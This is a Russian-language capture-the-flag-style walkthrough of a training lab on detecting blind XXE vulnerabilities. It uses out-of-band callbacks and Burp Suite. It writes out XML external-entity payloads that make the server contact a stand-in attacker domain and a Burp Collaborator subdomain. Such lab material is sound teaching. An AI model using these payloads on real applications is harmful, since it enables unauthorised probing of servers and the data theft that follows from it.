Что такое слепой XXE?
Уязвимости Blind XXE возникают, когда приложение уязвимо для внедрения XXE, но не возвращает значения каких-либо определенных внешних сущностей в своих ответах. Это означает, что прямое извлечение файлов на стороне сервера невозможно, и поэтому уязвимости Blind XXE, как правило, сложнее эксплуатировать, чем обычные уязвимости XXE.

Существует два основных способа обнаружения и эксплуатации уязвимостей слепого XXE:

Вы можете инициировать внеполосные сетевые взаимодействия, иногда извлекая конфиденциальные данные из данных взаимодействия.
Вы можете инициировать ошибки анализа XML таким образом, чтобы сообщения об ошибках содержали конфиденциальные данные.
Обнаружение слепого XXE с использованием внеполосных (OAST) методов
Часто можно обнаружить слепой XXE, используя ту же технику, что и для атак XXE SSRF , но запуская внеполосное сетевое взаимодействие с системой, которую вы контролируете. Например, вы можете определить внешний объект следующим образом:

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
Затем вы можете использовать определенную сущность в значении данных в XML.

Эта атака XXE заставляет сервер сделать бэкэнд HTTP-запрос на указанный URL. Злоумышленник может отслеживать результирующий DNS-поиск и HTTP-запрос и тем самым обнаружить, что атака XXE была успешной.

---

В этой лабораторной работе есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает результат.

Вы можете обнаружить слепую уязвимость XXE, инициировав внеполосное взаимодействие с внешним доменом.

Для решения лабораторной работы используйте внешнюю сущность, чтобы заставить XML-анализатор выполнить DNS-поиск и HTTP-запрос к Burp Collaborator.

---

1. Нас встречает список продуктов, переходим на любой из них:

![image](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

2. Внизу страницы есть кнопка "Проверить наличие на складе" включает Burp прокси и нажимаем:

![image](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

3. Заходим в Proxy -> HTTP History выбираем POST запрос к /product/stock и отправляем в Repeater: 

![image](https://github.com/user-attachments/assets/1b91cebe-7063-460d-93aa-b390c6a4df26)

---

4. Вставьте следующее определение внешней сущности между декларацией XML и stockCheck элементом. Щелкните правой кнопкой мыши и выберите «Вставить полезную нагрузку Collaborator», чтобы вставить поддомен Burp Collaborator, где указано: <!DOCTYPE stockCheck [ <!ENTITY eyes SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ] > и замените productId номер ссылкой на внешнюю сущность: &eyes;

![image](https://github.com/user-attachments/assets/e517ef38-cf10-47cb-8080-4a6446ee6367)

---

5. Перейдите на вкладку Collaborator и нажмите «Poll now». Если вы не видите перечисленных взаимодействий, подождите несколько секунд и попробуйте снова. Вы должны увидеть некоторые взаимодействия DNS и HTTP, которые были инициированы приложением в результате вашей полезной нагрузки.
